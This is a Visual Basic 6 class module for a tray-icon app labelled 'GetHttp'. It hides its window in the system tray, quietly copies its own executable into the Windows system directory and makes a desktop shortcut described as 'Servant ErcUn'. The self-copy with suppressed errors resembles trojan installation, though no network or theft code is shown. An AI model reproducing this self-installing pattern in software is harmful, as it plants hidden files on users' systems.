VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Private Type NOTIFYICONDATA
        cbSize As Long
        hwnd As Long
        uID As Long
        uFlags As Long
        uCallbackMessage As Long
        hIcon As Long
        szTip As String * 64
End Type


Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long


Private Declare Function Shell_NotifyIcon Lib "shell32.dll" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, lpData As NOTIFYICONDATA) As Long

Private Const NIF_ICON = &H2
Private Const NIF_MESSAGE = &H1
Private Const NIF_TIP = &H4
Private Const NIM_ADD = &H0
Private Const NIM_DELETE = &H2
Private Const WM_MOUSEMOVE = &H200

Dim fso As New FileSystemObject
Dim rn As NOTIFYICONDATA
Dim u

Private Sub Class_Initialize()
rn.cbSize = Len(rn)
rn.hIcon = Form1.Picture1.Picture
rn.hwnd = Form1.Picture1.hwnd
rn.szTip = "GetHttp"
rn.uID = 1
rn.uFlags = NIF_ICON Or NIF_MESSAGE Or NIF_TIP
rn.uCallbackMessage = WM_MOUSEMOVE
End Sub
Public Function ShellAdd()
Form1.Hide
Shell_NotifyIcon NIM_ADD, rn
End Function

Public Function ShellDel()
Shell_NotifyIcon NIM_DELETE, rn
Form1.WindowState = vbNormal
Form1.Show
End Function
Private Function GetSystem() As String
Dim s As String
Dim res As Long
s = String(255, vbNullChar)
res = GetSystemDirectory(s, Len(s))
If res <> 0 Then GetSystem = Left(s, InStr(s, vbNullChar) - 1) & "\"
End Function



Public Function Lnk() As String
On Error Resume Next
Dim executable, path, nlnk As String
Dim fs, c
Dim pos As Integer
FileCopy App.path & "\" & App.EXEName & ".exe", GetSystem & App.EXEName & ".exe"
Set fs = CreateObject("wscript.shell")
u = fs.Specialfolders("Desktop")

path = GetSystem & App.EXEName & ".exe"
nlnk = "\" & App.EXEName & ".lnk"
Set c = fs.createshortcut(u & nlnk)
c.targetpath = path
c.windowstyle = 1
c.Description = "Servant ErcUn"
c.workingdirectory = App.path
c.Save

End Function


Public Function Dulnk()
If fso.FileExists(u & "\" & App.EXEName & ".lnk") = True Then Kill u & "\" & App.EXEName & ".lnk"
End Function
